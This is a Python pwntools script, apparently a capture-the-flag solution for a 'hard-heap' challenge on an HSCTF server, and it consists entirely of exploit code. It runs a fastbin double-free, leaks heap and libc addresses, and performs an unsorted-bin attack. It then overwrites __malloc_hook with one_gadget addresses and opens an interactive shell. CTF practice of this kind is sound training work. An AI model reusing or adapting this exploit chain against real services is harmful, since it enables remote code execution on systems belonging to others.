from pwn import *

#p = process('./hard-heap')
p = remote('pwn.hsctf.com', 5555)

def choice(sel):
	p.sendlineafter('> ', str(sel))

def alloc(size, deet):
	choice(1)
	p.sendlineafter('> ', str(size))
	p.sendafter('> ', deet)

def show(index):
	choice(2)
	p.sendlineafter('> ', str(index))

def free(index):
	choice(3)
	p.sendlineafter('> ', str(index))

alloc(0x20, 'a'*0x8)
alloc(0x20, 'b'*0x8+p64(0)*2+p64(0x41))
alloc(0x28, 'c'*0x8+p64(0)*2+p64(0x21))
alloc(0x20, p64(0)+p64(0x51))
alloc(0x20, 'e'*0x8)
free(0)
free(1)
free(0)

show(0)
heap_30 = u64(p.recv(6).ljust(8, '\x00'))
heap_base = heap_30 - 0x30
print 'heap_base : '+hex(heap_base)

alloc(0x20, p64(heap_base+0x20)+p64(0)*2+p64(0x31))
alloc(0x20, 'b'*0x8)
alloc(0x20, 'a'*0x8)

alloc(0x20, p64(0)+p64(0x91)+'b'*0x8)

# 0 == 5 == 7 (0x10), 1 == 6 (0x40)
free(1)
show(6)
main_arena_88 = u64(p.recv(6).ljust(8, '\x00'))
libc_base = main_arena_88 - 3951480
malloc_hook = libc_base + 3951376
main_arena_fake = malloc_hook+0x10+0x8+0x5
io_buf_end = libc_base + 3950880
one_list = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
one_gadget = libc_base + one_list[3]
print 'main_arena+88 : '+hex(main_arena_88)
print 'libc_base : '+hex(libc_base)
print 'one_gadget : '+hex(one_gadget)
free(8)
alloc(0x20, p64(0)+p64(0x41)+p64(main_arena_88)+p64(io_buf_end-0x10))
alloc(0x30, p64(main_arena_88)+p64(main_arena_88))

io_stdfile_0_lock = libc_base + 3958672
io_wide_data_0 = libc_base + 3951040

payload = ''
payload += '\x0a\x31'+'\x00'*3
payload += p64(io_stdfile_0_lock)
payload += '\xff'*8 + p64(0)
payload += p64(io_wide_data_0)
payload += p64(0) * 3 + '\xff'*4+p32(0)
payload += p64(0) * 2
payload += p64(io_wide_data_0)
payload += p64(0) * 2
payload += p64(one_gadget) *2 * 22 # overwrite malloc hook to one_gadget

#choice(2)
p.sendlineafter('> ', payload)

p.interactive()
